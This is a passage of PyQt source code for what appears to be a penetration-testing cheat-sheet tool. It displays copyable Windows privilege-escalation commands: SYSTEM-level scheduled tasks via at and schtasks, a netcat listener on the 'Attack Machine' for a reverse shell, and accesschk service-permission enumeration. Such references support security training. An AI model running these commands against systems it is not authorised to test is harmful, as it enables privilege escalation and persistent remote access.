        self.tab4_container_layout.insertWidget(311,self.wpe_21_Scan1)
     
        # wpe_21_Scan1_Copy
        if hasattr(self, 'wpe_21_Scan1_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_21_Scan1_Copy)
            self.wpe_21_Scan1_Copy.deleteLater()
        self.wpe_21_Scan1_Copy = QPushButton()
        self.wpe_21_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_21_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wpe_21_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_21_Scan1.text()))
        self.wpe_21_Scan1_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_21_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_21_Scan1_Copy)
        label_layout.addWidget(self.wpe_21_Scan1)
        self.tab4_container_layout.insertLayout(312, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_21_divider1
        if hasattr(self, 'wpe_21_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_21_divider1)
            self.wpe_21_divider1.deleteLater()
        self.wpe_21_divider1 = QFrame()
        self.wpe_21_divider1.setFrameShape(QFrame.HLine)
        self.wpe_21_divider1.setLineWidth(3)
        self.wpe_21_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_21_divider2
        if hasattr(self, 'wpe_21_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_21_divider2)
            self.wpe_21_divider2.deleteLater()
        self.wpe_21_divider2 = QFrame()
        self.wpe_21_divider2.setFrameShape(QFrame.HLine)
        self.wpe_21_divider2.setLineWidth(3)
        self.wpe_21_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_21_spacer1
        if hasattr(self, 'wpe_21_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_21_spacer1)
            self.wpe_21_spacer1.deleteLater()
        self.wpe_21_spacer1 = QLabel()
        self.wpe_21_spacer1.setFixedWidth(40)
        self.wpe_21_spacer1.setFixedHeight(50)
     
        # wpe_21_spacer2
        if hasattr(self, 'wpe_21_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_21_spacer2)
            self.wpe_21_spacer2.deleteLater()
        self.wpe_21_spacer2 = QLabel()
        self.wpe_21_spacer2.setFixedWidth(40)
        self.wpe_21_spacer2.setFixedHeight(50)
     
        # wpe_21 spacer & divider layout
        self.tab4_container_layout.insertWidget(313, self.wpe_21_spacer1)
        self.tab4_container_layout.insertWidget(314, self.wpe_21_divider1)
        self.tab4_container_layout.insertWidget(315, self.wpe_21_divider2)
        self.tab4_container_layout.insertWidget(316, self.wpe_21_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_21_Scan2
        if hasattr(self, 'wpe_21_Scan2'):
            self.tab4_container_layout.removeWidget(self.wpe_21_Scan2)
            self.wpe_21_Scan2.deleteLater()
        self.wpe_21_Scan2 = QLabel("The current time is: 6:41:05.81")
        self.wpe_21_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(317,self.wpe_21_Scan2)
     
        # wpe_21_Scan2_Copy
        if hasattr(self, 'wpe_21_Scan2_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_21_Scan2_Copy)
            self.wpe_21_Scan2_Copy.deleteLater()
        self.wpe_21_Scan2_Copy = QPushButton()
        self.wpe_21_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_21_Scan2_Copy.setFixedSize(QSize(20,20))
        self.wpe_21_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_21_Scan2.text()))
        self.wpe_21_Scan2_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_21_Scan2 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_21_Scan2_Copy)
        label_layout.addWidget(self.wpe_21_Scan2)
        self.tab4_container_layout.insertLayout(318, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_21_divider1
        if hasattr(self, 'wpe_21_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_21_divider1)
            self.wpe_21_divider1.deleteLater()
        self.wpe_21_divider1 = QFrame()
        self.wpe_21_divider1.setFrameShape(QFrame.HLine)
        self.wpe_21_divider1.setLineWidth(3)
        self.wpe_21_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_21_divider2
        if hasattr(self, 'wpe_21_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_21_divider2)
            self.wpe_21_divider2.deleteLater()
        self.wpe_21_divider2 = QFrame()
        self.wpe_21_divider2.setFrameShape(QFrame.HLine)
        self.wpe_21_divider2.setLineWidth(3)
        self.wpe_21_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_21_spacer1
        if hasattr(self, 'wpe_21_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_21_spacer1)
            self.wpe_21_spacer1.deleteLater()
        self.wpe_21_spacer1 = QLabel()
        self.wpe_21_spacer1.setFixedWidth(40)
        self.wpe_21_spacer1.setFixedHeight(50)
     
        # wpe_21_spacer2
        if hasattr(self, 'wpe_21_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_21_spacer2)
            self.wpe_21_spacer2.deleteLater()
        self.wpe_21_spacer2 = QLabel()
        self.wpe_21_spacer2.setFixedWidth(40)
        self.wpe_21_spacer2.setFixedHeight(50)
     
        # wpe_21 spacer & divider layout
        self.tab4_container_layout.insertWidget(319, self.wpe_21_spacer1)
        self.tab4_container_layout.insertWidget(320, self.wpe_21_divider1)
        self.tab4_container_layout.insertWidget(321, self.wpe_21_divider2)
        self.tab4_container_layout.insertWidget(322, self.wpe_21_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_21_Scan3
        if hasattr(self, 'wpe_21_Scan3'):
            self.tab4_container_layout.removeWidget(self.wpe_21_Scan3)
            self.wpe_21_Scan3.deleteLater()
        self.wpe_21_Scan3 = QLabel("at 06:42 /interactive \"C:\\Tools\\Maint.exe\\\"")
        self.wpe_21_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(323,self.wpe_21_Scan3)
     
        # wpe_21_Scan3_Copy
        if hasattr(self, 'wpe_21_Scan3_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_21_Scan3_Copy)
            self.wpe_21_Scan3_Copy.deleteLater()
        self.wpe_21_Scan3_Copy = QPushButton()
        self.wpe_21_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_21_Scan3_Copy.setFixedSize(QSize(20,20))
        self.wpe_21_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_21_Scan3.text()))
        self.wpe_21_Scan3_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_21_Scan3 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_21_Scan3_Copy)
        label_layout.addWidget(self.wpe_21_Scan3)
        self.tab4_container_layout.insertLayout(324, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_21_divider1
        if hasattr(self, 'wpe_21_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_21_divider1)
            self.wpe_21_divider1.deleteLater()
        self.wpe_21_divider1 = QFrame()
        self.wpe_21_divider1.setFrameShape(QFrame.HLine)
        self.wpe_21_divider1.setLineWidth(3)
        self.wpe_21_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_21_divider2
        if hasattr(self, 'wpe_21_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_21_divider2)
            self.wpe_21_divider2.deleteLater()
        self.wpe_21_divider2 = QFrame()
        self.wpe_21_divider2.setFrameShape(QFrame.HLine)
        self.wpe_21_divider2.setLineWidth(3)
        self.wpe_21_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_21_spacer1
        if hasattr(self, 'wpe_21_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_21_spacer1)
            self.wpe_21_spacer1.deleteLater()
        self.wpe_21_spacer1 = QLabel()
        self.wpe_21_spacer1.setFixedWidth(40)
        self.wpe_21_spacer1.setFixedHeight(50)
     
        # wpe_21_spacer2
        if hasattr(self, 'wpe_21_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_21_spacer2)
            self.wpe_21_spacer2.deleteLater()
        self.wpe_21_spacer2 = QLabel()
        self.wpe_21_spacer2.setFixedWidth(40)
        self.wpe_21_spacer2.setFixedHeight(50)
     
        # wpe_21 spacer & divider layout
        self.tab4_container_layout.insertWidget(325, self.wpe_21_spacer1)
        self.tab4_container_layout.insertWidget(326, self.wpe_21_divider1)
        self.tab4_container_layout.insertWidget(327, self.wpe_21_divider2)
        self.tab4_container_layout.insertWidget(328, self.wpe_21_spacer2)
        self.tab4_container_layout.addStretch()
     
    # wpe_22
        if hasattr(self, 'wpe_22'):
            self.tab4_container_layout.removeWidget(self.wpe_22)
            self.wpe_22.deleteLater()
        self.wpe_22 = QLabel("[ + Create a Task. Run as System. Every 5 minutes. Path to binary ]")
        self.wpe_22.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(329,self.wpe_22)
     
        # wpe_22_Scan1
        if hasattr(self, 'wpe_22_Scan1'):
            self.tab4_container_layout.removeWidget(self.wpe_22_Scan1)
            self.wpe_22_Scan1.deleteLater()
        self.wpe_22_Scan1 = QLabel("schtasks /create /ru SYSTEM /sc MINUTE /MO 5 /tn RUNME /tr \"\"C:\\Tools\\Maint.exe\"\"")
        self.wpe_22_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(330,self.wpe_22_Scan1)
     
        # wpe_22_Scan1_Copy
        if hasattr(self, 'wpe_22_Scan1_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_22_Scan1_Copy)
            self.wpe_22_Scan1_Copy.deleteLater()
        self.wpe_22_Scan1_Copy = QPushButton()
        self.wpe_22_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_22_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wpe_22_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_22_Scan1.text()))
        self.wpe_22_Scan1_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_22_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_22_Scan1_Copy)
        label_layout.addWidget(self.wpe_22_Scan1)
        self.tab4_container_layout.insertLayout(331, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_22_divider1
        if hasattr(self, 'wpe_22_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_22_divider1)
            self.wpe_22_divider1.deleteLater()
        self.wpe_22_divider1 = QFrame()
        self.wpe_22_divider1.setFrameShape(QFrame.HLine)
        self.wpe_22_divider1.setLineWidth(3)
        self.wpe_22_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_22_divider2
        if hasattr(self, 'wpe_22_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_22_divider2)
            self.wpe_22_divider2.deleteLater()
        self.wpe_22_divider2 = QFrame()
        self.wpe_22_divider2.setFrameShape(QFrame.HLine)
        self.wpe_22_divider2.setLineWidth(3)
        self.wpe_22_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_22_spacer1
        if hasattr(self, 'wpe_22_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_22_spacer1)
            self.wpe_22_spacer1.deleteLater()
        self.wpe_22_spacer1 = QLabel()
        self.wpe_22_spacer1.setFixedWidth(40)
        self.wpe_22_spacer1.setFixedHeight(50)
     
        # wpe_22_spacer2
        if hasattr(self, 'wpe_22_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_22_spacer2)
            self.wpe_22_spacer2.deleteLater()
        self.wpe_22_spacer2 = QLabel()
        self.wpe_22_spacer2.setFixedWidth(40)
        self.wpe_22_spacer2.setFixedHeight(50)
     
        # wpe_22 spacer & divider layout
        self.tab4_container_layout.insertWidget(332, self.wpe_22_spacer1)
        self.tab4_container_layout.insertWidget(333, self.wpe_22_divider1)
        self.tab4_container_layout.insertWidget(334, self.wpe_22_divider2)
        self.tab4_container_layout.insertWidget(335, self.wpe_22_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_22_Scan2
        if hasattr(self, 'wpe_22_Scan2'):
            self.tab4_container_layout.removeWidget(self.wpe_22_Scan2)
            self.wpe_22_Scan2.deleteLater()
        self.wpe_22_Scan2 = QLabel("[ - Attack Machine ]")
        self.wpe_22_Scan2.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(336,self.wpe_22_Scan2)
     
        # wpe_22_Scan3
        if hasattr(self, 'wpe_22_Scan3'):
            self.tab4_container_layout.removeWidget(self.wpe_22_Scan3)
            self.wpe_22_Scan3.deleteLater()
        self.wpe_22_Scan3 = QLabel("nc -lvp 443")
        self.wpe_22_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(337,self.wpe_22_Scan3)
     
        # wpe_22_Scan3_Copy
        if hasattr(self, 'wpe_22_Scan3_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_22_Scan3_Copy)
            self.wpe_22_Scan3_Copy.deleteLater()
        self.wpe_22_Scan3_Copy = QPushButton()
        self.wpe_22_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_22_Scan3_Copy.setFixedSize(QSize(20,20))
        self.wpe_22_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_22_Scan3.text()))
        self.wpe_22_Scan3_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_22_Scan3 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_22_Scan3_Copy)
        label_layout.addWidget(self.wpe_22_Scan3)
        self.tab4_container_layout.insertLayout(338, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_22_divider1
        if hasattr(self, 'wpe_22_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_22_divider1)
            self.wpe_22_divider1.deleteLater()
        self.wpe_22_divider1 = QFrame()
        self.wpe_22_divider1.setFrameShape(QFrame.HLine)
        self.wpe_22_divider1.setLineWidth(3)
        self.wpe_22_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_22_divider2
        if hasattr(self, 'wpe_22_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_22_divider2)
            self.wpe_22_divider2.deleteLater()
        self.wpe_22_divider2 = QFrame()
        self.wpe_22_divider2.setFrameShape(QFrame.HLine)
        self.wpe_22_divider2.setLineWidth(3)
        self.wpe_22_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_22_spacer1
        if hasattr(self, 'wpe_22_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_22_spacer1)
            self.wpe_22_spacer1.deleteLater()
        self.wpe_22_spacer1 = QLabel()
        self.wpe_22_spacer1.setFixedWidth(40)
        self.wpe_22_spacer1.setFixedHeight(50)
     
        # wpe_22_spacer2
        if hasattr(self, 'wpe_22_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_22_spacer2)
            self.wpe_22_spacer2.deleteLater()
        self.wpe_22_spacer2 = QLabel()
        self.wpe_22_spacer2.setFixedWidth(40)
        self.wpe_22_spacer2.setFixedHeight(50)
     
        # wpe_22 spacer & divider layout
        self.tab4_container_layout.insertWidget(339, self.wpe_22_spacer1)
        self.tab4_container_layout.insertWidget(340, self.wpe_22_divider1)
        self.tab4_container_layout.insertWidget(341, self.wpe_22_divider2)
        self.tab4_container_layout.insertWidget(342, self.wpe_22_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_22_Scan4
        if hasattr(self, 'wpe_22_Scan4'):
            self.tab4_container_layout.removeWidget(self.wpe_22_Scan4)
            self.wpe_22_Scan4.deleteLater()
        self.wpe_22_Scan4 = QLabel("[ - Victim Machine ]")
        self.wpe_22_Scan4.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(343,self.wpe_22_Scan4)
     
        # wpe_22_Scan5
        if hasattr(self, 'wpe_22_Scan5'):
            self.tab4_container_layout.removeWidget(self.wpe_22_Scan5)
            self.wpe_22_Scan5.deleteLater()
        self.wpe_22_Scan5 = QLabel("schtasks /RUN /TN \"RUNME\"")
        self.wpe_22_Scan5.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(344,self.wpe_22_Scan5)
     
        # wpe_22_Scan5_Copy
        if hasattr(self, 'wpe_22_Scan5_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_22_Scan5_Copy)
            self.wpe_22_Scan5_Copy.deleteLater()
        self.wpe_22_Scan5_Copy = QPushButton()
        self.wpe_22_Scan5_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_22_Scan5_Copy.setFixedSize(QSize(20,20))
        self.wpe_22_Scan5_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_22_Scan5.text()))
        self.wpe_22_Scan5_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_22_Scan5 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_22_Scan5_Copy)
        label_layout.addWidget(self.wpe_22_Scan5)
        self.tab4_container_layout.insertLayout(345, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_22_divider1
        if hasattr(self, 'wpe_22_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_22_divider1)
            self.wpe_22_divider1.deleteLater()
        self.wpe_22_divider1 = QFrame()
        self.wpe_22_divider1.setFrameShape(QFrame.HLine)
        self.wpe_22_divider1.setLineWidth(3)
        self.wpe_22_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_22_divider2
        if hasattr(self, 'wpe_22_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_22_divider2)
            self.wpe_22_divider2.deleteLater()
        self.wpe_22_divider2 = QFrame()
        self.wpe_22_divider2.setFrameShape(QFrame.HLine)
        self.wpe_22_divider2.setLineWidth(3)
        self.wpe_22_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_22_spacer1
        if hasattr(self, 'wpe_22_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_22_spacer1)
            self.wpe_22_spacer1.deleteLater()
        self.wpe_22_spacer1 = QLabel()
        self.wpe_22_spacer1.setFixedWidth(40)
        self.wpe_22_spacer1.setFixedHeight(50)
     
        # wpe_22_spacer2
        if hasattr(self, 'wpe_22_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_22_spacer2)
            self.wpe_22_spacer2.deleteLater()
        self.wpe_22_spacer2 = QLabel()
        self.wpe_22_spacer2.setFixedWidth(40)
        self.wpe_22_spacer2.setFixedHeight(50)
     
        # wpe_22 spacer & divider layout
        self.tab4_container_layout.insertWidget(346, self.wpe_22_spacer1)
        self.tab4_container_layout.insertWidget(347, self.wpe_22_divider1)
        self.tab4_container_layout.insertWidget(348, self.wpe_22_divider2)
        self.tab4_container_layout.insertWidget(349, self.wpe_22_spacer2)
        self.tab4_container_layout.addStretch()
     
    # wpe_23
        if hasattr(self, 'wpe_23'):
            self.tab4_container_layout.removeWidget(self.wpe_23)
            self.wpe_23.deleteLater()
        self.wpe_23 = QLabel("[ + Fun with Accesschk Enumeration ]")
        self.wpe_23.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(350,self.wpe_23)
     
        # wpe_23_Scan1
        if hasattr(self, 'wpe_23_Scan1'):
            self.tab4_container_layout.removeWidget(self.wpe_23_Scan1)
            self.wpe_23_Scan1.deleteLater()
        self.wpe_23_Scan1 = QLabel("accesschk.exe /accepteula")
        self.wpe_23_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(351,self.wpe_23_Scan1)
     
        # wpe_23_Scan1_Copy
        if hasattr(self, 'wpe_23_Scan1_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_23_Scan1_Copy)
            self.wpe_23_Scan1_Copy.deleteLater()
        self.wpe_23_Scan1_Copy = QPushButton()
        self.wpe_23_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_23_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wpe_23_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_23_Scan1.text()))
        self.wpe_23_Scan1_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_23_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_23_Scan1_Copy)
        label_layout.addWidget(self.wpe_23_Scan1)
        self.tab4_container_layout.insertLayout(352, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_23_divider1
        if hasattr(self, 'wpe_23_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_23_divider1)
            self.wpe_23_divider1.deleteLater()
        self.wpe_23_divider1 = QFrame()
        self.wpe_23_divider1.setFrameShape(QFrame.HLine)
        self.wpe_23_divider1.setLineWidth(3)
        self.wpe_23_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_23_divider2
        if hasattr(self, 'wpe_23_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_23_divider2)
            self.wpe_23_divider2.deleteLater()
        self.wpe_23_divider2 = QFrame()
        self.wpe_23_divider2.setFrameShape(QFrame.HLine)
        self.wpe_23_divider2.setLineWidth(3)
        self.wpe_23_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_23_spacer1
        if hasattr(self, 'wpe_23_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_23_spacer1)
            self.wpe_23_spacer1.deleteLater()
        self.wpe_23_spacer1 = QLabel()
        self.wpe_23_spacer1.setFixedWidth(40)
        self.wpe_23_spacer1.setFixedHeight(50)
     
        # wpe_23_spacer2
        if hasattr(self, 'wpe_23_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_23_spacer2)
            self.wpe_23_spacer2.deleteLater()
        self.wpe_23_spacer2 = QLabel()
        self.wpe_23_spacer2.setFixedWidth(40)
        self.wpe_23_spacer2.setFixedHeight(50)
     
        # wpe_23 spacer & divider layout
        self.tab4_container_layout.insertWidget(353, self.wpe_23_spacer1)
        self.tab4_container_layout.insertWidget(354, self.wpe_23_divider1)
        self.tab4_container_layout.insertWidget(355, self.wpe_23_divider2)
        self.tab4_container_layout.insertWidget(356, self.wpe_23_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_23_Scan2
        if hasattr(self, 'wpe_23_Scan2'):
            self.tab4_container_layout.removeWidget(self.wpe_23_Scan2)
            self.wpe_23_Scan2.deleteLater()
        self.wpe_23_Scan2 = QLabel("accesschk.exe -ucqv [service_name]")
        self.wpe_23_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(357,self.wpe_23_Scan2)
     
        # wpe_23_Scan2_Copy
        if hasattr(self, 'wpe_23_Scan2_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_23_Scan2_Copy)
            self.wpe_23_Scan2_Copy.deleteLater()
        self.wpe_23_Scan2_Copy = QPushButton()
        self.wpe_23_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_23_Scan2_Copy.setFixedSize(QSize(20,20))
        self.wpe_23_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_23_Scan2.text()))
        self.wpe_23_Scan2_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_23_Scan2 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_23_Scan2_Copy)
        label_layout.addWidget(self.wpe_23_Scan2)
        self.tab4_container_layout.insertLayout(358, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_23_divider1
        if hasattr(self, 'wpe_23_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_23_divider1)
            self.wpe_23_divider1.deleteLater()
        self.wpe_23_divider1 = QFrame()
        self.wpe_23_divider1.setFrameShape(QFrame.HLine)
        self.wpe_23_divider1.setLineWidth(3)
        self.wpe_23_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_23_divider2
        if hasattr(self, 'wpe_23_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_23_divider2)
            self.wpe_23_divider2.deleteLater()
        self.wpe_23_divider2 = QFrame()
        self.wpe_23_divider2.setFrameShape(QFrame.HLine)
        self.wpe_23_divider2.setLineWidth(3)
        self.wpe_23_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_23_spacer1
        if hasattr(self, 'wpe_23_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_23_spacer1)
            self.wpe_23_spacer1.deleteLater()
        self.wpe_23_spacer1 = QLabel()
        self.wpe_23_spacer1.setFixedWidth(40)
        self.wpe_23_spacer1.setFixedHeight(50)
     
        # wpe_23_spacer2
        if hasattr(self, 'wpe_23_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_23_spacer2)
            self.wpe_23_spacer2.deleteLater()
        self.wpe_23_spacer2 = QLabel()
        self.wpe_23_spacer2.setFixedWidth(40)
        self.wpe_23_spacer2.setFixedHeight(50)
     
        # wpe_23 spacer & divider layout
        self.tab4_container_layout.insertWidget(359, self.wpe_23_spacer1)
        self.tab4_container_layout.insertWidget(360, self.wpe_23_divider1)
        self.tab4_container_layout.insertWidget(361, self.wpe_23_divider2)
        self.tab4_container_layout.insertWidget(362, self.wpe_23_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_23_Scan3
        if hasattr(self, 'wpe_23_Scan3'):
            self.tab4_container_layout.removeWidget(self.wpe_23_Scan3)
            self.wpe_23_Scan3.deleteLater()
        self.wpe_23_Scan3 = QLabel("accesschk.exe -uwcqv \"Authenticated Users\"")
        self.wpe_23_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(363,self.wpe_23_Scan3)
     
        # wpe_23_Scan3_Copy
        if hasattr(self, 'wpe_23_Scan3_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_23_Scan3_Copy)
            self.wpe_23_Scan3_Copy.deleteLater()
        self.wpe_23_Scan3_Copy = QPushButton()
        self.wpe_23_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_23_Scan3_Copy.setFixedSize(QSize(20,20))
        self.wpe_23_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_23_Scan3.text()))
        self.wpe_23_Scan3_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_23_Scan3 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_23_Scan3_Copy)
        label_layout.addWidget(self.wpe_23_Scan3)
        self.tab4_container_layout.insertLayout(364, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_23_divider1
        if hasattr(self, 'wpe_23_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_23_divider1)
            self.wpe_23_divider1.deleteLater()
        self.wpe_23_divider1 = QFrame()
        self.wpe_23_divider1.setFrameShape(QFrame.HLine)
        self.wpe_23_divider1.setLineWidth(3)
        self.wpe_23_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_23_divider2
        if hasattr(self, 'wpe_23_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_23_divider2)
            self.wpe_23_divider2.deleteLater()
        self.wpe_23_divider2 = QFrame()
        self.wpe_23_divider2.setFrameShape(QFrame.HLine)
        self.wpe_23_divider2.setLineWidth(3)
        self.wpe_23_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_23_spacer1
        if hasattr(self, 'wpe_23_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_23_spacer1)
            self.wpe_23_spacer1.deleteLater()
        self.wpe_23_spacer1 = QLabel()
        self.wpe_23_spacer1.setFixedWidth(40)
        self.wpe_23_spacer1.setFixedHeight(50)
     
        # wpe_23_spacer2
        if hasattr(self, 'wpe_23_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_23_spacer2)
            self.wpe_23_spacer2.deleteLater()
        self.wpe_23_spacer2 = QLabel()
        self.wpe_23_spacer2.setFixedWidth(40)
        self.wpe_23_spacer2.setFixedHeight(50)
     
        # wpe_23 spacer & divider layout
        self.tab4_container_layout.insertWidget(365, self.wpe_23_spacer1)
        self.tab4_container_layout.insertWidget(366, self.wpe_23_divider1)
        self.tab4_container_layout.insertWidget(367, self.wpe_23_divider2)
        self.tab4_container_layout.insertWidget(368, self.wpe_23_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_23_Scan4
        if hasattr(self, 'wpe_23_Scan4'):
            self.tab4_container_layout.removeWidget(self.wpe_23_Scan4)
            self.wpe_23_Scan4.deleteLater()
        self.wpe_23_Scan4 = QLabel("accesschk.exe -ucqv [service_name]")
        self.wpe_23_Scan4.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(369,self.wpe_23_Scan4)
     
